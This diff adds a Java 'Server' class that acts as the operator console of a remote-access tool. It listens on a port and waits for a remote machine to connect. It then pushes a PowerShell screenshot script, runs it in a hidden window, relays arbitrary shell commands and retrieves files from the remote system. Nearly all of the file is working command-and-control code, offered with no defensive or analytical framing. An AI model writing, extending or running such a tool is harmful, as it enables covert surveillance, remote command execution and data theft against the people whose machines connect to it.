@@ -1,0 +1,203 @@
+package terminal;
+
+import java.io.FileWriter;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.ServerSocket;
+import java.net.Socket;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Paths;
+import java.util.Scanner;
+
+public class Server {
+
+    static boolean saveFile = false;
+    static String fileToBeSaved = "";
+
+    static String sendFilePath = "sendFile/";
+    static String receiveFilePath = "receivedFile/";
+
+    static OutputStream os;
+    static InputStream is;
+
+    //starting server and initialize all variables
+    private static void initializeServer(int port) throws IOException {
+        ServerSocket serverSocket = new ServerSocket(port);
+        Socket socket = serverSocket.accept(); //waiting for remote access
+        System.out.println("connected");
+        os = socket.getOutputStream();
+        is = socket.getInputStream();
+    }
+
+    //method to send script in beginning
+    private static void sendInitialScript() throws IOException, InterruptedException {
+        //reading screenshot script file
+        String fileName = "screenshot.ps1";   //keep name of the script file to be send
+        String content = readFile(fileName);
+
+        //sending command along with script file to the remote system
+        String cmd = "sc sc.ps1 " + content;
+        writeMsg(cmd);
+        System.out.println("script send.....");
+        Thread.sleep(100);
+        //executing script file present in remote system
+        System.out.println("executing script.....");
+        cmd = "start powershell -windowstyle hidden .\\sc.ps1";
+        writeMsg(cmd);
+        System.out.println("Excecution succesfull.....");
+    }
+
+    public static void main(String[] args) throws IOException, InterruptedException {
+        System.out.println("To send file type command:\n $sc fileToBeSaved.txt SourceFile.txt\n" +
+                "\nTo retrieve file type command:\n $gc fileToBeRetrieved.txt\n" +
+                "This fie will be saved in recieved file directory\n");
+
+        int port = Integer.parseInt(args[0]);
+        //starting server
+        initializeServer(port);
+
+        //to send script file at beginning
+        sendInitialScript();    //comment it if not needed
+
+        //read all incoming messages from remote system
+        Thread read = new Thread(() -> {
+            while (true) {
+                String msg = "";
+                try {
+                    if (is.available() > 0) {
+                        msg = readMsg();
+
+                        //if file is to be copied from remote system
+                        if (saveFile) {
+                            try {
+                                writeFile(msg, fileToBeSaved);
+                                msg = fileToBeSaved + " saved in host successfully!!!";
+                            } catch (IOException e) {
+                                msg = fileToBeSaved + " Error saving file in host system";
+                            }
+                            saveFile = false;
+                        }
+                        System.out.println(msg);
+                    }
+
+                } catch (IOException e) {
+                    System.out.println("Error reading messages from Remote System...");
+                }
+            }
+        });
+        read.start();
+
+        //send commands to be executes on remote server
+        Thread write = new Thread(() -> {
+            Scanner sc = new Scanner(System.in);
+            while (true) {
+                //read input from console
+                String msg = sc.nextLine();
+                msg = checkForCustomCommands(msg); //check for custom commands
+                //send command to remote system
+                try {
+                    writeMsg(msg);
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+        write.start();
+
+    }
+
+
+    //writeMsg() & readMsg() methods are used for sending & reading messages over TCP connection
+    //between Host & Remote system
+
+    //method to send command to remote system
+    private static void writeMsg(String cmd) throws IOException {
+        os.write(cmd.getBytes());
+        os.flush();
+    }
+
+    //method receive output from remote system
+    private static String readMsg() {
+        String msg = "";
+        try {
+            if (is.available() > 0) {
+                int d = 0;
+                while ((d = is.read()) != 38) {
+                    msg = msg + (char) d;
+                }
+            }
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return msg;
+    }
+
+
+    //retrieveFile() & sendFile() methods are used for File operations with the Remote system
+
+    // method to retrieve file from remote system
+    private static String retrieveFile(String msg, OutputStream os) {
+        msg = msg.replaceFirst("\\$", "");
+        saveFile = true;
+        fileToBeSaved = msg.split(" ")[1];
+        System.out.println("Retrieving file " + fileToBeSaved + "....");
+        return msg;
+    }
+
+    //method to send host file to remote system
+    private static String sendFile(String msg) throws IOException {
+        // remove $ from the msg
+        msg = msg.replaceFirst("\\$", "");
+        System.out.println(msg);
+        //retrieve filename from msg
+        String fileName = msg.split(" ")[2];
+        //read file
+        String content = readFile(fileName);
+        //replace filename with content of file
+        msg = msg.replace(fileName, content);
+        System.out.println(msg);
+        System.out.println("Sending file " + fileName + " to Remote System......");
+        return msg;
+    }
+
+    //readFile() & writeFile() methods are used for file operations with host system
+
+    //method to read file in host system present in sendFile directory
+    private static String readFile(String fileName) {
+        System.out.println("Reading from host file " + fileName + ".....");
+        String content = "";
+        try {
+            Scanner scanner = new Scanner(Paths.get(sendFilePath+fileName), StandardCharsets.UTF_8.name());
+            content = scanner.useDelimiter("\\A")
+                    .next();
+            scanner.close();
+        } catch (IOException e) {
+            System.out.println("File not found in host system....");
+        }
+        return content;
+    }
+
+    //method to write file in host in receivedFile directory
+    private static void writeFile(String msg, String fileName) throws IOException {
+        System.out.println("writing in host file " + fileToBeSaved + ".....");
+        FileWriter writer = new FileWriter(receiveFilePath+fileName);
+        writer.write(fileName);
+        writer.flush();
+        writer.close();
+    }
+
+    //method defined for custom commands
+    private static String checkForCustomCommands(String cmd) {
+        if (cmd.startsWith("$sc")) {     //send file to remote system
+            try {
+                return sendFile(cmd);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        } else if (cmd.startsWith("$gc")) {      //retrieve file from remote system
+            return retrieveFile(cmd, os);
+        }
+        return cmd;
+    }
+}
